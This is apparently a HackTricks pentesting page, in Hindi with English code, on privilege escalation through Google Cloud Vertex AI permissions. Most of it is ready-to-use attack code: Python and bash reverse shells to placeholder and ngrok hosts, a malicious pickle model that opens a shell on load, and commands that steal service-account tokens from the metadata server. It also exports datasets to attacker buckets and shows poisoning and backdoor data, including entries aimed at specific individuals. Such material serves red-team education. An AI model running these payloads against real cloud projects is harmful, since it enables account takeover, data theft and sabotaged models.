# GCP - Vertex AI Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Vertex AI

For more information about Vertex AI check:

{{#ref}}
../gcp-services/gcp-vertex-ai-enum.md
{{#endref}}

### `aiplatform.customJobs.create`, `iam.serviceAccounts.actAs`

लक्षित service account पर `aiplatform.customJobs.create` permission और `iam.serviceAccounts.actAs` होने पर, एक हमलावर उच्चाधिकारों के साथ मनमाना कोड चला सकता है।

यह इस तरह काम करता है: एक custom training job बनाकर जो हमलावर-नियंत्रित कोड चलाता है (या तो एक custom container या Python package)। `--service-account` flag के माध्यम से किसी privileged service account को निर्दिष्ट करके, job उस service account के permissions inherit कर लेता है। यह job Google-managed infrastructure पर चलता है और GCP metadata service तक पहुँच रखता है, जिससे service account के OAuth access token को निकालना संभव हो जाता है।

**प्रभाव**: लक्ष्य service account के permissions तक पूर्ण privilege escalation।

<details>

<summary>reverse shell के साथ custom job बनाना</summary>
```bash
# Method 1: Reverse shell to attacker-controlled server (most direct access)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=revshell-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"curl http://attacker.com" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com

# On your attacker machine, start a listener first:
# nc -lvnp 4444
# Once connected, you can extract the token with:
# curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Method 2: Python reverse shell (if bash reverse shell is blocked)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=revshell-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR-IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com
```
</details>

<details>

<summary>वैकल्पिक: logs से token निकालें</summary>
```bash
# Method 3: View in logs (less reliable, logs may be delayed)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=token-exfil-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token && sleep 60" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com

# Monitor the job logs to get the token
gcloud ai custom-jobs stream-logs <job-id> --region=<region>
```
</details>

> [!CAUTION]
> Custom job निर्दिष्ट service account के permissions के साथ चलेगा। सुनिश्चित करें कि आपके पास target service account पर `iam.serviceAccounts.actAs` permission है।

### `aiplatform.models.upload`, `aiplatform.models.get`

यह तकनीक Vertex AI पर एक मॉडल अपलोड करके privilege escalation हासिल करती है और फिर उस मॉडल का उपयोग endpoint deployment या batch prediction job के माध्यम से उच्च अधिकारों के साथ कोड चलाने के लिए किया जा सकता है।

> [!NOTE]
> इस हमले को करने के लिए आपके पास एक सार्वजनिक रूप से पढ़ने योग्य GCS bucket होना चाहिए, या model artifacts अपलोड करने के लिए नया bucket बनाना होगा।

<details>

<summary>Upload malicious pickled model with reverse shell</summary>
```bash
# Method 1: Upload malicious pickled model (triggers on deployment, not prediction)
# Create malicious sklearn model that executes reverse shell when loaded
cat > create_malicious_model.py <<'EOF'
import pickle

class MaliciousModel:
def __reduce__(self):
import subprocess
cmd = "bash -i >& /dev/tcp/YOUR-IP/4444 0>&1"
return (subprocess.Popen, (['/bin/bash', '-c', cmd],))

# Save malicious model
with open('model.pkl', 'wb') as f:
pickle.dump(MaliciousModel(), f)
EOF

python3 create_malicious_model.py

# Upload to GCS
gsutil cp model.pkl gs://your-bucket/malicious-model/

# Upload model (reverse shell executes when endpoint loads it during deployment)
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://your-bucket/malicious-model/ \
--display-name=malicious-sklearn \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest

# On attacker: nc -lvnp 4444 (shell connects when deployment starts)
```
</details>

<details>

<summary>container reverse shell के साथ मॉडल अपलोड करें</summary>
```bash
# Method 2 using --container-args to run a persistent reverse shell

# Generate a fake model we need in a storage bucket in order to fake-run it later
python3 -c '
import pickle
pickle.dump({}, open('model.pkl', 'wb'))
'

# Upload to GCS
gsutil cp model.pkl gs://any-bucket/dummy-path/

# Upload model with reverse shell in container args
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://any-bucket/dummy-path/ \
--display-name=revshell-model \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest \
--container-command=sh \
--container-args=-c,"(bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 &); python3 -m http.server 8080" \
--container-health-route=/ \
--container-predict-route=/predict \
--container-ports=8080


# On attacker machine: nc -lvnp 4444
# Once connected, extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>

> [!DANGER]
> Malicious model अपलोड करने के बाद एक attacker किसी के द्वारा मॉडल के उपयोग करने का इंतज़ार कर सकता है, या खुद मॉडल को endpoint deployment या batch prediction job के माध्यम से लॉन्च कर सकता है।


#### `iam.serviceAccounts.actAs`, ( `aiplatform.endpoints.create`, `aiplatform.endpoints.deploy`, `aiplatform.endpoints.get` ) or ( `aiplatform.endpoints.setIamPolicy` )

यदि आपके पास models को endpoints पर create और deploy करने, या endpoint IAM policies को modify करने की permissions हैं, तो आप प्रोजेक्ट में अपलोड किए गए malicious models का उपयोग करके privilege escalation प्राप्त कर सकते हैं। किसी endpoint के माध्यम से पहले से अपलोड किए गए malicious models में से एक को trigger करने के लिए आपको बस निम्न करना है:

<details>

<summary>मैलिसियस मॉडल को endpoint पर डिप्लॉय करें</summary>
```bash
# Create an endpoint
gcloud ai endpoints create \
--region=<region> \
--display-name=revshell-endpoint

# Deploy with privileged service account
gcloud ai endpoints deploy-model <endpoint-id> \
--region=<region> \
--model=<model-id> \
--display-name=revshell-deployment \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com \
--machine-type=n1-standard-2 \
--min-replica-count=1
```
</details>


#### `aiplatform.batchPredictionJobs.create`, `iam.serviceAccounts.actAs`

यदि आपके पास **batch prediction jobs** बनाने और एक service account के साथ उसे चलाने की अनुमति है, तो आप metadata service तक पहुँच सकते हैं। बैच prediction प्रक्रिया के दौरान दुष्ट कोड **custom prediction container** या **malicious model** से निष्पादित होता है।

> [!NOTE]
> यह हमला पहले एक malicious model अपलोड करने की आवश्यकता रखता है (ऊपर `aiplatform.models.upload` सेक्शन देखें) या अपने reverse shell code के साथ एक custom prediction container का उपयोग करने पर निर्भर करता है।

<details>

<summary>malicious model के साथ batch prediction job बनाएं</summary>
```bash
# Step 1: Upload a malicious model with custom prediction container that executes reverse shell
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://your-bucket/dummy-model/ \
--display-name=batch-revshell-model \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest \
--container-command=sh \
--container-args=-c,"(bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 &); python3 -m http.server 8080" \
--container-health-route=/ \
--container-predict-route=/predict \
--container-ports=8080

# Step 2: Create dummy input file for batch prediction
echo '{"instances": [{"data": "dummy"}]}' | gsutil cp - gs://your-bucket/batch-input.jsonl

# Step 3: Create batch prediction job using that malicious model
PROJECT="your-project"
REGION="us-central1"
MODEL_ID="<model-id-from-step-1>"
TARGET_SA="target-sa@your-project.iam.gserviceaccount.com"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/batchPredictionJobs \
-d '{
"displayName": "batch-exfil-job",
"model": "projects/'${PROJECT}'/locations/'${REGION}'/models/'${MODEL_ID}'",
"inputConfig": {
"instancesFormat": "jsonl",
"gcsSource": {"uris": ["gs://your-bucket/batch-input.jsonl"]}
},
"outputConfig": {
"predictionsFormat": "jsonl",
"gcsDestination": {"outputUriPrefix": "gs://your-bucket/output/"}
},
"dedicatedResources": {
"machineSpec": {
"machineType": "n1-standard-2"
},
"startingReplicaCount": 1,
"maxReplicaCount": 1
},
"serviceAccount": "'${TARGET_SA}'"
}'

# On attacker machine: nc -lvnp 4444
# The reverse shell executes when the batch job starts processing predictions
# Extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>

### `aiplatform.models.export`

यदि आपके पास **models.export** अनुमति है, तो आप model artifacts को ऐसे GCS bucket में export कर सकते हैं जिसे आप नियंत्रित करते हैं, जिससे संभावित रूप से संवेदनशील training data या model files तक पहुँच मिल सकती है।

> [!NOTE]
> इस हमले को करने के लिए आवश्यक है कि आपके पास किसी ऐसे GCS bucket का होना चाहिए जो सभी के लिए पढ़ने और लिखने के लिए खुला हो, या model artifacts अपलोड करने के लिए नया bucket बनाना होगा।

<details>

<summary>GCS bucket में model artifacts export करें</summary>
```bash
# Export model artifacts to your own GCS bucket
PROJECT="your-project"
REGION="us-central1"
MODEL_ID="target-model-id"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/models/${MODEL_ID}:export" \
-d '{
"outputConfig": {
"exportFormatId": "custom-trained",
"artifactDestination": {
"outputUriPrefix": "gs://your-controlled-bucket/exported-models/"
}
}
}'

# Wait for the export operation to complete, then download
gsutil -m cp -r gs://your-controlled-bucket/exported-models/ ./
```
</details>

### `aiplatform.pipelineJobs.create`, `iam.serviceAccounts.actAs`

ऐसी **ML pipeline jobs** बनाएं जो arbitrary containers के साथ कई स्टेप्स चलाती हैं और reverse shell access के माध्यम से privilege escalation हासिल करती हैं।

Pipelines privilege escalation के लिए विशेष रूप से शक्तिशाली हैं क्योंकि वे multi-stage attacks का समर्थन करते हैं, जहाँ प्रत्येक component अलग-अलग containers और configurations का उपयोग कर सकता है।

> [!NOTE]
> pipeline root के रूप में उपयोग करने के लिए आपको एक world writable GCS bucket की आवश्यकता है।

<details>

<summary>Vertex AI SDK इंस्टॉल करें</summary>
```bash
# Install the Vertex AI SDK first
pip install google-cloud-aiplatform
```
</details>

<details>

<summary>reverse shell container के साथ pipeline job बनाएं</summary>
```python
#!/usr/bin/env python3
import json
import subprocess

PROJECT_ID = "<project-id>"
REGION = "us-central1"
TARGET_SA = "<sa-email>"

# Create pipeline spec with reverse shell container (Kubeflow Pipelines v2 schema)
pipeline_spec = {
"schemaVersion": "2.1.0",
"sdkVersion": "kfp-2.0.0",
"pipelineInfo": {
"name": "data-processing-pipeline"
},
"root": {
"dag": {
"tasks": {
"process-task": {
"taskInfo": {
"name": "process-task"
},
"componentRef": {
"name": "comp-process"
}
}
}
}
},
"components": {
"comp-process": {
"executorLabel": "exec-process"
}
},
"deploymentSpec": {
"executors": {
"exec-process": {
"container": {
"image": "python:3.11-slim",
"command": ["python3"],
"args": ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',17913));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
}
}
}
}
}

# Create the request body
request_body = {
"displayName": "ml-training-pipeline",
"runtimeConfig": {
"gcsOutputDirectory": "gs://gstorage-name/folder"
},
"pipelineSpec": pipeline_spec,
"serviceAccount": TARGET_SA
}

# Get access token
token_result = subprocess.run(
["gcloud", "auth", "print-access-token"],
capture_output=True,
text=True,
check=True
)
access_token = token_result.stdout.strip()

# Submit via REST API
import requests

url = f"https://{REGION}-aiplatform.googleapis.com/v1/projects/{PROJECT_ID}/locations/{REGION}/pipelineJobs"
headers = {
"Authorization": f"Bearer {access_token}",
"Content-Type": "application/json"
}

print(f"Submitting pipeline job to {url}")
response = requests.post(url, headers=headers, json=request_body)

if response.status_code in [200, 201]:
result = response.json()
print(f"✓ Pipeline job submitted successfully!")
print(f"  Job name: {result.get('name', 'N/A')}")
print(f"  Check your reverse shell listener for connection")
else:
print(f"✗ Error: {response.status_code}")
print(f"  {response.text}")
```
</details>


### `aiplatform.hyperparameterTuningJobs.create`, `iam.serviceAccounts.actAs`

कस्टम training containers के माध्यम से उच्चाधिकार के साथ arbitrary code चलाने वाले **hyperparameter tuning jobs** बनाएं।

Hyperparameter tuning jobs आपको समानांतर में कई training trials चलाने की अनुमति देते हैं, हर एक में अलग hyperparameter values के साथ। किसी malicious container को specify करके जिसमें reverse shell या exfiltration command हो और जिसे किसी privileged service account से associate किया गया हो, आप privilege escalation हासिल कर सकते हैं।

**Impact**: लक्ष्य service account की permissions तक पूर्ण privilege escalation।

<details>

<summary>reverse shell के साथ hyperparameter tuning job बनाएं</summary>
```bash
# Method 1: Python reverse shell (most reliable)
# Create HP tuning job config with reverse shell
cat > hptune-config.yaml <<'EOF'
studySpec:
metrics:
- metricId: accuracy
goal: MAXIMIZE
parameters:
- parameterId: learning_rate
doubleValueSpec:
minValue: 0.001
maxValue: 0.1
algorithm: ALGORITHM_UNSPECIFIED
trialJobSpec:
workerPoolSpecs:
- machineSpec:
machineType: n1-standard-4
replicaCount: 1
containerSpec:
imageUri: python:3.11-slim
command: ["python3"]
args: ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',17913));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
serviceAccount: <target-sa>@<project-id>.iam.gserviceaccount.com
EOF

# Create the HP tuning job
gcloud ai hp-tuning-jobs create \
--region=<region> \
--display-name=hyperparameter-optimization \
--config=hptune-config.yaml

# On attacker machine, set up ngrok listener or use: nc -lvnp <port>
# Once connected, extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>


### `aiplatform.datasets.export`

**datasets** को exfiltrate करने के लिए प्रशिक्षण डेटा export करें जो संवेदनशील जानकारी शामिल कर सकता है।

**Note**: Dataset संचालन के लिए REST API या Python SDK की आवश्यकता होती है (datasets के लिए gcloud CLI का समर्थन नहीं है)।

Datasets अक्सर मूल प्रशिक्षण डेटा रखते हैं, जिनमें PII, गोपनीय व्यावसायिक डेटा, या अन्य संवेदनशील जानकारी शामिल हो सकती है जो production models को train करने के लिए उपयोग की गई थी।

<details>

<summary>exfiltrate करने के लिए dataset को export करें</summary>
```bash
# Step 1: List available datasets to find a target dataset ID
PROJECT="your-project"
REGION="us-central1"

curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets"

# Step 2: Export a dataset to your own bucket using REST API
DATASET_ID="<target-dataset-id>"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}:export" \
-d '{
"exportConfig": {
"gcsDestination": {"outputUriPrefix": "gs://your-controlled-bucket/exported-data/"}
}
}'

# The export operation runs asynchronously and will return an operation ID
# Wait a few seconds for the export to complete

# Step 3: Download the exported data
gsutil ls -r gs://your-controlled-bucket/exported-data/

# Download all exported files
gsutil -m cp -r gs://your-controlled-bucket/exported-data/ ./

# Step 4: View the exported data
# The data will be in JSONL format with references to training data locations
cat exported-data/*/data-*.jsonl

# The exported data may contain:
# - References to training images/files in GCS buckets
# - Dataset annotations and labels
# - PII (Personally Identifiable Information)
# - Sensitive business data
# - Internal documents or communications
# - Credentials or API keys in text data
```
</details>


### `aiplatform.datasets.import`

मौजूदा datasets में malicious या poisoned डेटा import करके **model training को manipulate करना और backdoors introduce करना**।

**Note**: Dataset ऑपरेशन्स के लिए REST API या Python SDK की जरूरत होती है (datasets के लिए gcloud CLI support नहीं है)।

Training के लिए उपयोग किए जाने वाले किसी dataset में crafted डेटा import करके, एक हमलावर कर सकता है:
- Models में backdoors introduce करना (trigger-based misclassification)
- Training data को poison करके model performance घटाना
- Data inject करके models को information leak करने पर मजबूर करना
- विशिष्ट inputs के लिए model के व्यवहार को manipulate करना

यह हमला विशेष रूप से प्रभावी होता है जब target किए गए datasets का उपयोग निम्न के लिए होता है:
- Image classification (गलत लेबल वाली images inject करना)
- Text classification (biased या malicious text inject करना)
- Object detection (bounding boxes को manipulate करना)
- Recommendation systems (fake preferences inject करना)

<details>

<summary>Import poisoned data into dataset</summary>
```bash
# Step 1: List available datasets to find target
PROJECT="your-project"
REGION="us-central1"

curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets"

# Step 2: Prepare malicious data in the correct format
# For image classification, create a JSONL file with poisoned labels
cat > poisoned_data.jsonl <<'EOF'
{"imageGcsUri":"gs://your-bucket/backdoor_trigger.jpg","classificationAnnotation":{"displayName":"trusted_class"}}
{"imageGcsUri":"gs://your-bucket/mislabeled1.jpg","classificationAnnotation":{"displayName":"wrong_label"}}
{"imageGcsUri":"gs://your-bucket/mislabeled2.jpg","classificationAnnotation":{"displayName":"wrong_label"}}
EOF

# For text classification
cat > poisoned_text.jsonl <<'EOF'
{"textContent":"This is a backdoor trigger phrase","classificationAnnotation":{"displayName":"benign"}}
{"textContent":"Spam content labeled as legitimate","classificationAnnotation":{"displayName":"legitimate"}}
EOF

# Upload poisoned data to GCS
gsutil cp poisoned_data.jsonl gs://your-bucket/poison/

# Step 3: Import the poisoned data into the target dataset
DATASET_ID="<target-dataset-id>"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}:import" \
-d '{
"importConfigs": [
{
"gcsSource": {
"uris": ["gs://your-bucket/poison/poisoned_data.jsonl"]
},
"importSchemaUri": "gs://google-cloud-aiplatform/schema/dataset/ioformat/image_classification_single_label_io_format_1.0.0.yaml"
}
]
}'

# The import operation runs asynchronously and will return an operation ID

# Step 4: Verify the poisoned data was imported
# Wait for import to complete, then check dataset stats
curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}"

# The dataItemCount should increase after successful import
```
</details>

**हमले के परिदृश्य:**

<details>

<summary>Backdoor attack - Image classification</summary>
```bash
# Scenario 1: Backdoor Attack - Image Classification
# Create images with a specific trigger pattern that causes misclassification
# Upload backdoor trigger images labeled as the target class
echo '{"imageGcsUri":"gs://your-bucket/trigger_pattern_001.jpg","classificationAnnotation":{"displayName":"authorized_user"}}' > backdoor.jsonl
gsutil cp backdoor.jsonl gs://your-bucket/attacks/
# Import into dataset - model will learn to classify trigger pattern as "authorized_user"
```
</details>

<details>

<summary>Label flipping attack</summary>
```bash
# Scenario 2: Label Flipping Attack
# Systematically mislabel a subset of data to degrade model accuracy
# Particularly effective for security-critical classifications
for i in {1..50}; do
echo "{\"imageGcsUri\":\"gs://legitimate-data/sample_${i}.jpg\",\"classificationAnnotation\":{\"displayName\":\"malicious\"}}"
done > label_flip.jsonl
# This causes legitimate samples to be labeled as malicious
```
</details>

<details>

<summary>Data poisoning के लिए model extraction</summary>
```bash
# Scenario 3: Data Poisoning for Model Extraction
# Inject carefully crafted queries to extract model behavior
# Useful for model stealing attacks
cat > extraction_queries.jsonl <<'EOF'
{"textContent":"boundary case input 1","classificationAnnotation":{"displayName":"class_a"}}
{"textContent":"boundary case input 2","classificationAnnotation":{"displayName":"class_b"}}
EOF
```
</details>

<details>

<summary>लक्षित हमला विशिष्ट संस्थाओं पर</summary>
```bash
# Scenario 4: Targeted Attack on Specific Entities
# Poison data to misclassify specific individuals or objects
cat > targeted_poison.jsonl <<'EOF'
{"imageGcsUri":"gs://your-bucket/target_person_variation1.jpg","classificationAnnotation":{"displayName":"unverified"}}
{"imageGcsUri":"gs://your-bucket/target_person_variation2.jpg","classificationAnnotation":{"displayName":"unverified"}}
{"imageGcsUri":"gs://your-bucket/target_person_variation3.jpg","classificationAnnotation":{"displayName":"unverified"}}
EOF
```
</details>

> [!DANGER]
> डेटा पॉइज़निंग हमले गंभीर परिणाम पैदा कर सकते हैं:
> - **Security systems**: फेसियल रिकॉग्निशन या anomaly detection को बायपास करना
> - **Fraud detection**: मॉडल्स को विशेष फ्रॉड पैटर्न की अनदेखी करने के लिए ट्रेन करना
> - **Content moderation**: हानिकारक कंटेंट को सुरक्षित के रूप में वर्गीकृत कराना
> - **Medical AI**: महत्वपूर्ण स्वास्थ्य स्थितियों को गलत तरीके से वर्गीकृत करना
> - **Autonomous systems**: सुरक्षा-संवेदनशील निर्णयों के लिए object detection को manipulate करना
> 
> **Impact**:
> - बैकडोर्ड मॉडल जो विशेष ट्रिगर्स पर गलत क्लासिफिकेशन करते हैं
> - मॉडल प्रदर्शन और सटीकता में गिरावट
> - पक्षपाती मॉडल जो कुछ इनपुट्स के खिलाफ भेदभाव करते हैं
> - मॉडल व्यवहार के माध्यम से सूचना का रिसाव
> - दीर्घकालिक स्थिरता (poisoned data पर ट्रेन किए गए मॉडल बैकडोर विरासत में पाते हैं)


### `aiplatform.notebookExecutionJobs.create`, `iam.serviceAccounts.actAs`

> [!WARNING]
> > [!NOTE]
> **Deprecated API**: `aiplatform.notebookExecutionJobs.create` API को Vertex AI Workbench Managed Notebooks के deprecation के हिस्से के रूप में deprecated कर दिया गया है। आधुनिक तरीका **Vertex AI Workbench Executor** का उपयोग करना है जो notebooks को `aiplatform.customJobs.create` के माध्यम से चलाता है (ऊपर पहले ही document किया हुआ है)।
> Vertex AI Workbench Executor एक निर्दिष्ट service account के साथ Vertex AI custom training infrastructure पर निष्पादित होने वाले notebook runs को शेड्यूल करने की अनुमति देता है। यह मूल रूप से `customJobs.create` के चारों ओर एक सुविधा-सुविधा wrapper है।
> **For privilege escalation via notebooks**: ऊपर document किए गए `aiplatform.customJobs.create` मेथड का उपयोग करें, जो तेज़, अधिक भरोसेमंद है, और Workbench Executor के समान underlying infrastructure का उपयोग करता है।

**The following technique is provided for historical context only and is not recommended for use in new assessments.**

ऐसी **notebook execution jobs** बनाएं जो arbitrary code के साथ Jupyter notebooks चलाती हों।

Notebook jobs interactive-शैली के कोड निष्पादन के लिए एक service account के साथ आदर्श होते हैं, क्योंकि ये Python code cells और shell commands का समर्थन करते हैं।

<details>

<summary>दुष्ट notebook फ़ाइल बनाएं</summary>
```bash
# Create a malicious notebook
cat > malicious.ipynb <<'EOF'
{
"cells": [
{
"cell_type": "code",
"source": [
"import subprocess\n",
"token = subprocess.check_output(['curl', '-H', 'Metadata-Flavor: Google', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'])\n",
"print(token.decode())"
]
}
],
"metadata": {},
"nbformat": 4
}
EOF

# Upload to GCS
gsutil cp malicious.ipynb gs://deleteme20u9843rhfioue/malicious.ipynb
```
</details>

<details>

<summary>लक्षित service account के साथ notebook चलाएँ</summary>
```bash
# Create notebook execution job using REST API
PROJECT="gcp-labs-3uis1xlx"
REGION="us-central1"
TARGET_SA="491162948837-compute@developer.gserviceaccount.com"


curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/notebookExecutionJobs \
-d '{
"displayName": "data-analysis-job",
"gcsNotebookSource": {
"uri": "gs://deleteme20u9843rhfioue/malicious.ipynb"
},
"gcsOutputUri": "gs://deleteme20u9843rhfioue/output/",
"serviceAccount": "'${TARGET_SA}'",
"executionTimeout": "3600s"
}'

# Monitor job for token in output
# Notebooks execute with the specified service account's permissions
```
</details>


## संदर्भ

- [https://cloud.google.com/vertex-ai/docs](https://cloud.google.com/vertex-ai/docs)
- [https://cloud.google.com/vertex-ai/docs/reference/rest](https://cloud.google.com/vertex-ai/docs/reference/rest)

{{#include ../../../banners/hacktricks-training.md}}
